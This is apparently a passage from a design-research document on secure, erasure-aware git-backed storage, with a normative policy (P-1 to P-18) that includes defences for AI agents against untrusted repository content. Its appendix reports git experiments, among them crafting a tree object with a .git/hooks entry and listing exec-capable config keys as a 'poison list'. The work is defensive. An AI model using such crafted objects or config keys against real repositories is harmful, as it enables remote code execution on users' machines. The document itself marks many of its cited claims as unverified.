already has the mechanism: `RESEARCH.md` §4 establishes a content-addressed
store with pointers in git for attachments. Extend it. An artifact may mark a
region, a column, or a whole file as *external*: git holds a stable identifier
and a hash; the bytes live in the CAS, which is mutable and erasable. Erasure
becomes deleting a CAS object — an O(1), verifiable, forge-independent
operation. History retains a dangling reference, which is precisely CNIL's
commitment-on-ledger / data-off-ledger pattern. **This is the single most
important thing to specify, and it is nearly free given the CAS already exists
for attachment bloat.**

**E2. Crypto-shredding for external content, per-subject.** Encrypt each external
object under a per-subject key; erasure destroys the key. NIST's glossary
definition of Cryptographic Erase (`csrc.nist.gov/glossary/term/cryptographic_erase`,
citing SP 800-88): "A purge sanitization technique in which key sanitization is
applied to one or more keys providing confidentiality protections for the
encrypted target data, making recovery of the decrypted target data
infeasible." **Be careful how this is claimed.** `[UNVERIFIED: no ICO, EDPB, or
ENISA statement was located confirming crypto-shredding satisfies GDPR Art. 17;
also the retrieved NIST wording is the current-revision glossary text, not
verified against SP 800-88 Rev. 1 specifically.]` Ship it as defence in depth
and as a genuine reduction in exposure; do not market it as legal compliance.

**E3. Identity is indirect by default.** Commit authorship uses a stable
pseudonymous identifier resolved through a local, mutable identity map, so a
name or address is not stamped into thousands of immutable commit objects. This
costs almost nothing at design time and is impossible to add later.

**E4. A stated history horizon.** "Everything in git forever" should be a
*choice a user makes*, not a default they discover. Offer a documented,
supported operation that truncates history to a horizon (squash-and-truncate,
new root, published as a new repo identity), with honest disclosure that
collaborators must re-clone and forge-side copies may persist.

**E5. Truthful documentation.** The product must state plainly: history is
durable; a force-push does not delete; forks are unreachable; forge support must
be contacted; treat anything committed as published. GitHub's own "revoke and/or
rotate" advice is the model of the right tone.

**E6. Prevention at the boundary.** Because E1 only helps if it is used, the
substrate should detect likely personal data at commit time and offer to route
it to external storage *before* the first commit. Prevention is the only cheap
intervention; every other one on this list is expensive or partial.

The honest summary for the design: **git-backed storage and a general right to
erasure are incompatible, and the resolution is scope — the substrate guarantees
erasure for content it was told is erasable, and guarantees nothing for content
committed as ordinary text.** That is a real answer with a real boundary, and it
is defensible in a way that a disclaimer is not.

---

## 9. The policy, consolidated

Normative. MUST / MUST NOT are design commitments, not aspirations.

**P-1 (Totality).** The formula and derivation language MUST be total,
terminating, deterministic, and I/O-free. No `while`, no user recursion, no
clock, no RNG, no locale, no environment, no filesystem, no network. These MUST
be absent from the grammar, not disabled by a flag. There MUST NOT exist a
setting that changes this.

**P-2 (No user-authored code).** An artifact MUST NOT be able to define a
function, only to name one. Extension happens by the local user installing a
plugin. Naming is a request; binding is a local grant.

**P-3 (Budgets).** Evaluation MUST carry a static cost estimate and a runtime
step/memory budget. Exhaustion MUST produce a visible error in the cell. It MUST
NOT produce a partial, empty, zero, or stale value.

**P-4 (Numerics).** Decimal by default. Binary floating point MUST NOT be the
default arithmetic for a financial table.

**P-5 (Declare, never bind).** A repository MAY declare artifact types,
formatting, column names/types/units, formulas, a declarative derivation graph
of repo-relative paths, schemas in the same total language, and the *names* +
version constraints + content hashes of plugins. A repository MUST NOT be able
to supply code, hooks, git config, or anything that causes code to be selected
that the local user has not already installed.

**P-6 (Nothing executes on acquisition).** `clone`, `fetch`, `pull`, `checkout`,
and open MUST execute nothing but git and the substrate's own parsers. No hook
analogue MUST exist. The substrate MUST NOT write local git config as a result
of reading a repo, and MUST NOT set, merge, or template any key on the poison
list (§6.5.3).

**P-7 (No content-triggered egress).** No URL originating in repo content MUST
be fetched automatically — not images, fonts, stylesheets, favicons, link
previews, plugin downloads, or schema `$ref`s. Remote images render as
click-to-load placeholders showing the literal URL.

**P-8 (TOFU, local, itemised, revocable).** Trust is per-repository, recorded in
local application state keyed by remote URL + root-commit OID, never inside the
repo. Untrusted is the default and MUST be fully functional for everything in
P-5. Elevation MUST list each named binding being activated and MUST only select
among already-installed capabilities. Submodules MUST NOT inherit trust. A
change to the declaration set MUST re-prompt.

**P-9 (Loud degradation).** A declared-but-unbound name MUST produce a visible
in-document notice. Silent fail-open (measured, Appendix A.2) is a defect, not a
feature.

**P-10 (Agent egress).** An agent session that has read untrusted repo content
MUST NOT thereafter reach an arbitrary network destination. Enforcement is by
the substrate, outside the model's control.

**P-11 (Agent action set).** The action set MUST be fixed from the user's
instruction before untrusted bytes are read. Untrusted content MUST NOT
authorise a new tool call.

**P-12 (Agents cannot grant themselves permission).** Trust records, plugin
registry, and permission state MUST live outside the repo and MUST NOT be
writable by any agent-invoked tool at any trust level, with no override.
(CVE-2025-53773.)

**P-13 (Path confinement).** Repo file access exposed to agents MUST be confined
by canonicalisation and component comparison with symlinks resolved and
cross-boundary links refused. String-prefix matching MUST NOT be used.
(CVE-2025-53109, CVE-2025-53110.)

**P-14 (Parsers are execution primitives).** Every parser reachable from repo
bytes MUST be memory-safe and fuzzed. No path validation MUST rest on a single
predicate.

**P-15 (One sandbox, one place).** Third-party plugins run in a WebAssembly
component with an explicit import list, no ambient authority, and an
install-time capability manifest. OS confinement (seccomp/Landlock, macOS
sandbox, AppContainer) is applied best-effort to the derivation child process as
defence in depth, and no correctness or security claim MUST depend on it.

**P-16 (No per-file encryption for sharing).** Sharing boundaries are repository
boundaries, or a filtered projection. Encryption at rest for a whole repo is
orthogonal and permitted.

**P-17 (Erasable content is declared).** The substrate MUST support marking
content as external — identifier and hash in git, bytes in the mutable CAS —
and MUST document that erasure is guaranteed only for such content. Commit
authorship MUST default to a pseudonymous identifier resolved through a local
identity map.

**P-18 (Truthful documentation).** The product MUST state that history is
durable, force-push does not delete, forks are unreachable, and anything
committed should be treated as published; and that an agent with repo access
plus network access is the lethal trifecta.

### What this costs, stated honestly

No goal-seek, no circular references, no user-defined recursive functions, no
Monte Carlo, no VBA-equivalent. Power users are not served and will notice.
CaMeL's measured ~7 percentage points of agent task success is the likely order
of the agent-side cost. P-7 makes remote images a click. P-16 means "share one
sheet with a contractor" is "make another repo." These are real losses and the
argument of §4.2 is that they fall on a population this product was not going to
win anyway — but they should be argued, not hidden.

---

## 10. Verification status

**Verified empirically here** (Appendix A): hooks are not cloned; `.gitattributes`
travels while its drivers do not, and the resulting merge-driver and filter
fail-open is silent; git refuses to check out a path under `.git/` and fsck
flags `hasDotgit`; a one-line edit flips 99.5% of ciphertext bytes under
git-crypt's construction and turns a clean plaintext auto-merge into an
unresolvable conflict; git's own retention defaults and `filter-branch` warning.

**Verified against primary sources**: all CVE descriptions and scores quoted
here came from the NVD REST API or vendor advisories; git documentation quotes
came from git's own `.adoc` sources or the installed man pages; language
guarantees came from the projects' own specs; git-crypt, GitHub, GitLab, Truffle
Security, Willison, Invariant Labs, CNIL, and Ink & Switch quotes are from the
named URLs.

**NOT verified — do not cite from this document.** Consolidated:

- CERT CA-1999-04 primary text.
- Proofpoint's ~66% macro-decline figure (Oct 2021–Jun 2022).
- The XLM/Excel-4.0 resurgence narrative and Microsoft's XLM default-disable +
  AMSI integration — no primary source at all.
- Microsoft ADV170021's own text.
- ISO 19005 (PDF/A) verbatim spec wording (Wikipedia paraphrase used instead).
- Repeated `-dSAFER` bypasses beyond CVE-2018-16509.
- Jupyter's exact signature-storage paths (`notebook_secret`, `nbsignatures.db`).
- The origin text of the 2014 "Comma Separated Vulnerabilities" post.
- A specific documented `WEBSERVICE()`/`HYPERLINK()` exfiltration incident; any
  specific HackerOne CSV-injection report; Excel Protected View / Google Sheets
  IMPORT* / LibreOffice link-prompt behaviour.
- wasmtime CVE-2023-26489, CVE-2022-39392, CVE-2021-39216 by number (the 2024–26
  advisories quoted ARE confirmed).
- Guido van Rossum's 2003 python-dev statement — **not located; do not
  attribute a quote to him on the strength of this document.**
- Any specific Lua-sandboxing writeup.
- Microsoft's LAMBDA announcement wording ("Turing-complete", "world's most
  widely used programming language").
- Bazel `--experimental_repository_hash_file` doc text; Nix IFD caveats in the
  manual's words; Helm/Ansible/Jsonnet specifics.
- Enron/EUSES figures beyond the two quoted (76%/15 functions; 24% error rate).
- Greshake et al.'s exact six-category taxonomy wording.
- The Aim Labs EchoLeak mechanism narrative (the CVE record IS confirmed).
- CamoLeak; PromptArmor Slack AI (Aug 2024); Amazon Q Developer incident (Jul
  2025); AgentFlayer/Zenity — **no primary source reached for any of these.**
- OpenAI's `url_safe` specifics.
- Git CVEs 2024-32020, 2024-32021, 2023-25652, 2023-29007, 2018-11235,
  2021-21300, 2025-48385/48386, 2025-27613, 2025-46334/46835 — **not confirmed
  via NVD here.** The four in §6.2 are confirmed.
- Current 2026 status of git's SHA-256 transition, interop, and forge support.
- Shai-Hulud npm worm; figures on malicious packages using install scripts.
- SOPS `updatekeys` mechanics re: historical ciphertext.
- josh's exact push-back/bidirectional mechanics.
- CNIL's precise Article 17 language / "delete the key = erasure" equivalence.
- NIST SP 800-88 **Rev. 1** exact wording (the quoted definition is
  current-revision glossary text).
- **Any regulator (ICO/EDPB/ENISA) statement that crypto-shredding satisfies
  GDPR Art. 17 — not located. Treat as an open legal question.**

Cause of most gaps: the session's WebSearch budget was exhausted before this
research began, so everything went through direct WebFetch against guessed
primary URLs; ISO, MSRC's update-guide SPA, Proofpoint's archive, CERT/SEI
legacy pages, ACM DL, and web.archive.org were all unreachable or JS-only.

---

## Appendix A — Empirical results (git 2.47.3, Linux 6.12.101, 2026-08-28)

All demonstrations are INERT: the only "payload" used anywhere below writes a
marker file or echoes a string. Nothing malicious was constructed or run.

### A.1 Git hooks are not cloned — verified

Setup: a repo with an executable `.git/hooks/post-checkout` that writes a marker
file. Clone it, check for the marker.

    --- clone1 hooks dir contents (non-.sample):
    (none - only .sample files)
    --- did inert hook run on clone?
    NO - did not run (hooks not cloned)

Hooks live in `.git/hooks/`, which is **not part of any tree object**, so no
hook can be delivered by `clone`, `fetch`, or `pull`. The fresh clone contains
only git's own `*.sample` templates. Installing hooks is always an explicit
local act (`init.templateDir`, `git clone --template`, `core.hooksPath`, or
copying files in).

### A.2 `.gitattributes` travels; the driver it names does not — verified

`.gitattributes` is a tracked file, so it clones. The *definition* of any driver
it references lives in `.git/config` / `~/.gitconfig`, which does not clone.

    -- .gitattributes present in clone:
    *.sheet.md merge=daffmerge
    -- is merge driver 'daffmerge' defined in clone config?
    NOT DEFINED -> merge driver silently falls back

Consequence, measured on a real merge in that clone:

    Auto-merging data.sheet.md
    CONFLICT (content): Merge conflict in data.sheet.md
    name,qty
    apples,1
    <<<<<<< HEAD
    cherries,3
    =======
    bananas,2
    >>>>>>> branchA

This is the fail-open behaviour already established as a hard constraint. Note
what it means in *security* terms, which is the more important half: the split
is not an accident, it is the mechanism. A repo may **name** a behaviour; only
the local user may **bind** that name to code. `.gitattributes` is a
declaration; `.git/config` is the capability grant. This is exactly the trust
boundary the substrate should copy.

### A.2b The same split for clean/smudge filters — and silent activation

A repo declaring `secret.txt filter=myfilter diff=mydiff`, freshly cloned:

    === fresh clone: attributes are active, driver undefined ===
    secret.txt: diff: mydiff
    secret.txt: filter: myfilter
    -- filter.myfilter.smudge defined?  NO
    -- any warning on checkout? (rm + restore):
      exit=0 / content: plaintext

The attributes are live — `check-attr` confirms git is applying them — and the
checkout proceeds with raw content, exit 0, **no warning of any kind**. Then a
single local grant:

    === does defining the filter locally silently activate it? ===
    (git config filter.myfilter.smudge 'sed s/plaintext/SMUDGED/')
      content now: SMUDGED

One local config line turned an inert declaration into running code, with no
change to the repository at all. This is the capability grant in its clearest
form: the repo said *which files and which name*; the user said *what that name
means*. Both halves are required, and only the second one confers power.

### A.3 Git refuses to check out a path under `.git/` — verified

Using plumbing, a tree entry literally named `.git` **can** be created as an
object:

    root tree with a .git/ entry was CREATED as object: 43fa659d...
    100755 blob 531f39d6...  .git/hooks/post-checkout

`git fsck --strict` flags it:

    error in tree 43fa659d...: hasDotgit: contains '.git'

and both `read-tree` and `checkout` refuse to materialise it:

    error: invalid path '.git/hooks/post-checkout'
    --- did .git/hooks/post-checkout get written?
    NOT written (git refused)

So the object layer is permissive and the **checkout layer** (`verify_path()`)
is the guard. That is precisely why the RCE-on-clone CVEs are all *bypasses of
the checkout guard* — via symlinks, case-insensitive filesystems, NTFS short
names, or submodule paths — rather than direct `.git` writes. Defence sits in
one place, so every bypass of that one place is a full compromise. Design
lesson: do not build a substrate whose safety rests on a single path-validation
predicate.

Exec-capable config keys confirmed present in this git's `git-config(1)`:
`core.fsmonitor`, `core.fsmonitorHookVersion`, `core.sshCommand`,
`core.askPass`, `core.hooksPath`, `core.editor`, `core.pager`,
`credential.helper`, `diff.external`, `sequence.editor`,
`uploadpack.packObjectsHook`. Any one of these, if settable by a cloned repo,
is remote code execution. This is the list to treat as poison.

### A.4 Encrypted files do not merge — verified and quantified

Simulated git-crypt's construction exactly where it matters: an AES-CTR-style
stream whose **nonce is an HMAC over the whole plaintext** (this is git-crypt's
actual design, chosen to make encryption deterministic so identical files
produce identical blobs). Any plaintext change changes the nonce, so the entire
keystream changes.

A 2,963-byte, 201-row CSV; two edits on lines 3 and 191 — far apart, disjoint,
the easy case:

    plaintext size: 2963 bytes
    A vs base: 2961/2975 bytes differ = 99.5%
    B vs base: 2967/2975 bytes differ = 99.7%

A one-line edit changes **99.5% of the stored bytes**. Then the merge, same two
edits, run through real git:

    ########## CASE 1: PLAINTEXT (control) ##########
     s.csv | 2 +-
     1 file changed, 1 insertion(+), 1 deletion(-)
    conflict markers: 0

    ########## CASE 2: ENCRYPTED blobs, same two disjoint edits ##########
    Auto-merging s.enc
    CONFLICT (content): Merge conflict in s.enc
    Automatic merge failed; fix conflicts and then commit the result.

    ########## CASE 2b: force text merge on the ciphertext ##########
    (-text diff in .gitattributes)
    CONFLICT (content): Merge conflict in s.enc

The control merges silently and correctly. The encrypted version conflicts, and
forcing git to treat the ciphertext as text does not help. Worse than a normal
conflict: the conflict is **unresolvable by a human**, because both sides are
ciphertext, and unresolvable by the merge tool, because the tool sees the
`clean`ed (encrypted) blobs, not the smudged working tree.

Two consequences, both decisive:

1. Per-file encryption converts every concurrent edit into a manual
   full-file-choose-a-side. Combined with the already-established single-writer
   constraint, encryption-in-git and collaborative editing are mutually
   exclusive on the same file.
2. Encryption also destroys the diff, which was the product premise. The
   compression story goes with it: 99.5% byte churn per edit means every
   revision stores a fresh full copy, so an encrypted file has the storage
   profile of a binary attachment, not of text.

### A.5 Git's own retention defaults (from `git-config(1)` on this machine)

    gc.pruneExpire
        When git gc is run, it will call prune --expire 2.weeks.ago ...
    gc.reflogExpireUnreachable
        git reflog expire removes reflog entries older than this time and
        are not reachable from the current tip; defaults to 30 days.

So even locally, "deleted" content survives a default two weeks to thirty days
after it stops being referenced — before considering any forge.

And `git-filter-branch(1)`'s own WARNING, verbatim from the installed man page:

    git filter-branch has a plethora of pitfalls that can produce non-obvious
    manglings of the intended history rewrite (and can leave you with little
    time to investigate such problems since it has such abysmal performance).
    These safety and performance issues cannot be backward compatibly fixed and
    as such, its use is not recommended. Please use an alternative history
    filtering tool such as git filter-repo.
